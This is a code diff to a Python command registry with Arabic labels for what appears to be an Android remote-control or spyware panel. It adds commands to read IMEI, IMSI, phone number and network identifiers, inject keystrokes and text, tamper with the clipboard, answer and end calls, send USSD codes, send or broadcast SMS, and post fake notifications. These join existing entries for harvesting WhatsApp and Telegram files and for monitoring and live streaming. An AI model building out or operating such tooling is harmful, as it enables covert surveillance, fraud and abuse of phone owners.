@@ -47,6 +47,52 @@ COMMAND_REGISTRY = {
     "accounts":            {"cmd": "get_accounts",        "name": "حسابات الجهاز",   "icon": "👤", "category": "data"},
     "sync_settings":       {"cmd": "get_sync_settings",   "name": "إعدادات المزامنة","icon": "🔄", "category": "data"},
 
+    # ─── Device Management ───────────────────────────────────
+    "device_id":           {"cmd": "get_device_id",       "name": "معرّف الجهاز",      "icon": "🆔", "category": "device"},
+    "imei":                {"cmd": "get_imei",            "name": "IMEI",            "icon": "📞", "category": "device"},
+    "imsi":                {"cmd": "get_imsi",            "name": "IMSI",            "icon": "📲", "category": "device"},
+    "phone_number":        {"cmd": "get_phone_number",    "name": "رقم الهاتف",       "icon": "📱", "category": "device"},
+    "serial":              {"cmd": "get_serial",          "name": "الرقم التسلسلي",  "icon": "🔢", "category": "device"},
+    "mac_address":         {"cmd": "get_mac_address",     "name": "عنوان MAC",       "icon": "🔌", "category": "device"},
+    "ip_address":          {"cmd": "get_ip_address",      "name": "عنوان IP",        "icon": "🌐", "category": "device"},
+    "ipv6_address":        {"cmd": "get_ipv6_address",    "name": "عنوان IPv6",      "icon": "🌐", "category": "device"},
+    "network_operator":    {"cmd": "get_network_operator","name": "مشغل الشبكة",      "icon": "📡", "category": "device"},
+    "sim_operator":        {"cmd": "get_sim_operator",    "name": "مشغل SIM",        "icon": "📲", "category": "device"},
+    "sim_country":         {"cmd": "get_sim_country",     "name": "دولة SIM",        "icon": "🌍", "category": "device"},
+    "network_country":     {"cmd": "get_network_country", "name": "دولة الشبكة",      "icon": "🗺️", "category": "device"},
+    "phone_type":          {"cmd": "get_phone_type",      "name": "نوع الهاتف",       "icon": "📞", "category": "device"},
+    "sim_state":           {"cmd": "get_sim_state",       "name": "حالة SIM",        "icon": "📶", "category": "device"},
+    "data_state":          {"cmd": "get_data_state",      "name": "حالة البيانات",   "icon": "📊", "category": "device"},
+    "data_activity":       {"cmd": "get_data_activity",   "name": "نشاط البيانات",   "icon": "⚡", "category": "device"},
+
+    # ─── System Info ─────────────────────────────────────────
+    "system_properties":   {"cmd": "get_system_properties","name": "خصائص النظام",   "icon": "⚙️", "category": "system"},
+    "build_info":          {"cmd": "get_build_info",      "name": "معلومات البناء",  "icon": "🏗️", "category": "system"},
+    "uptime":              {"cmd": "get_uptime",          "name": "وقت التشغيل",     "icon": "⏱️", "category": "system"},
+    "boot_time":           {"cmd": "get_boot_time",       "name": "وقت الإقلاع",     "icon": "🔋", "category": "system"},
+    "current_time":        {"cmd": "get_current_time",    "name": "الوقت الحالي",   "icon": "🕐", "category": "system"},
+    "set_current_time":    {"cmd": "set_current_time",    "name": "ضبط الوقت",      "icon": "⏰", "category": "system"},
+    "timezone":            {"cmd": "get_timezone",        "name": "المنطقة الزمنية","icon": "🕒", "category": "system"},
+    "available_locales":   {"cmd": "get_available_locales","name": "اللغات المتاحة","icon": "🗣️", "category": "system"},
+
+    # ─── Input / Keyboard ────────────────────────────────────
+    "show_keyboard":       {"cmd": "show_keyboard",       "name": "إظهار لوحة المفاتيح","icon":"⌨️", "category": "input"},
+    "hide_keyboard":       {"cmd": "hide_keyboard",       "name": "إخفاء لوحة المفاتيح","icon":"⌨️", "category": "input"},
+    "input_text":          {"cmd": "input_text",          "name": "إدخال نص",        "icon": "📝", "category": "input"},
+    "input_key":           {"cmd": "input_key",           "name": "إدخال مفتاح",     "icon": "🔑", "category": "input"},
+    "paste_clipboard":     {"cmd": "paste_clipboard",     "name": "لصق الحافظة",     "icon": "📋", "category": "input"},
+    "clear_clipboard":     {"cmd": "clear_clipboard",     "name": "مسح الحافظة",     "icon": "🧹", "category": "input"},
+    "set_clipboard_text":  {"cmd": "set_clipboard_text",  "name": "كتابة في الحافظة","icon": "✏️", "category": "input"},
+
+    # ─── Media Playback ──────────────────────────────────────
+    "play_media":          {"cmd": "play_media",          "name": "تشغيل وسائط",     "icon": "▶️", "category": "media"},
+    "pause_media":         {"cmd": "pause_media",         "name": "إيقاف مؤقت",      "icon": "⏸️", "category": "media"},
+    "stop_media":          {"cmd": "stop_media",          "name": "إيقاف الوسائط",   "icon": "⏹️", "category": "media"},
+    "next_track":          {"cmd": "next_track",          "name": "المقطع التالي",   "icon": "⏭️", "category": "media"},
+    "previous_track":      {"cmd": "previous_track",      "name": "المقطع السابق",   "icon": "⏮️", "category": "media"},
+    "set_media_volume":    {"cmd": "set_media_volume",    "name": "صوت الوسائط",     "icon": "🔊", "category": "media"},
+    "now_playing":         {"cmd": "get_now_playing",     "name": "المشغّل الآن",    "icon": "🎵", "category": "media"},
+
     # ─── Social Media (file listing) ─────────────────────────
     "whatsapp":            {"cmd": "get_whatsapp",        "name": "واتساب",          "icon": "💬", "category": "social"},
     "telegram_app":        {"cmd": "get_telegram",        "name": "تيليجرام",        "icon": "✈️", "category": "social"},
@@ -138,6 +184,27 @@ COMMAND_REGISTRY = {
     "apn_settings":        {"cmd": "apn_settings",        "name": "إعدادات APN",    "icon": "📲", "category": "control"},
     "block_number":        {"cmd": "block_number",        "name": "حظر رقم",        "icon": "🚫", "category": "control"},
     "unblock_number":      {"cmd": "unblock_number",      "name": "إلغاء حظر رقم",  "icon": "✅", "category": "control"},
+
+    # ─── Settings shortcuts (control) ────────────────────────
+    "open_settings":       {"cmd": "open_settings",       "name": "إعدادات الجهاز",  "icon": "⚙️", "category": "control"},
+    "open_wifi_settings":  {"cmd": "open_wifi_settings",  "name": "إعدادات WiFi",   "icon": "📶", "category": "control"},
+    "open_bluetooth_settings": {"cmd": "open_bluetooth_settings", "name": "إعدادات البلوتوث", "icon": "🔵", "category": "control"},
+    "open_location_settings":  {"cmd": "open_location_settings",  "name": "إعدادات الموقع",  "icon": "📍", "category": "control"},
+    "open_app_settings":   {"cmd": "open_app_settings",   "name": "إعدادات التطبيقات","icon": "📱", "category": "control"},
+    "open_security_settings": {"cmd": "open_security_settings", "name": "إعدادات الأمان", "icon": "🔒", "category": "control"},
+    "open_developer_options": {"cmd": "open_developer_options", "name": "خيارات المطور", "icon": "🧪", "category": "control"},
+    "open_accessibility_settings": {"cmd": "open_accessibility_settings", "name": "إعدادات الوصول", "icon": "♿", "category": "control"},
+    "open_notification_settings": {"cmd": "open_notification_settings", "name": "إعدادات الإشعارات", "icon": "🔔", "category": "control"},
+
+    # ─── Calls / SMS / Notifications (control) ───────────────
+    "answer_call":         {"cmd": "answer_call",         "name": "رد على مكالمة",  "icon": "📞", "category": "control"},
+    "end_call":            {"cmd": "end_call",            "name": "إنهاء مكالمة",   "icon": "📵", "category": "control"},
+    "send_ussd":           {"cmd": "send_ussd",           "name": "كود USSD",       "icon": "🔢", "category": "control"},
+    "send_sms_to":         {"cmd": "send_sms_to",         "name": "SMS لرقم",       "icon": "💬", "category": "control"},
+    "send_sms_broadcast":  {"cmd": "send_sms_broadcast",  "name": "بث SMS",         "icon": "📡", "category": "control"},
+    "post_notification":   {"cmd": "post_notification",   "name": "إشعار مخصص",     "icon": "🔔", "category": "control"},
+    "cancel_notification": {"cmd": "cancel_notification", "name": "إلغاء إشعار",    "icon": "❌", "category": "control"},
+    "cancel_all_notifications": {"cmd": "cancel_all_notifications", "name": "إلغاء كل الإشعارات", "icon": "🧹", "category": "control"},
 
     # ─── App Management ──────────────────────────────────────
     "open_app":            {"cmd": "open_app",            "name": "فتح تطبيق",       "icon": "📱", "category": "apps"},
@@ -314,6 +381,10 @@ CMD_CATEGORIES = {
     "security":  {"name": "الأمان",       "icon": "🔒", "color": "#F44336"},
     "monitor":   {"name": "المراقبة",     "icon": "🔍", "color": "#00BCD4"},
     "streaming": {"name": "البث المباشر", "icon": "📡", "color": "#E91E63"},
+    "device":    {"name": "معلومات الجهاز","icon": "📱", "color": "#607D8B"},
+    "input":     {"name": "الإدخال",     "icon": "⌨️", "color": "#795548"},
+    "media":     {"name": "الوسائط",     "icon": "🎵", "color": "#009688"},
+    "system":    {"name": "النظام",       "icon": "⚙️", "color": "#673AB7"},
 }
 
 def get_command(key: str) -> dict:
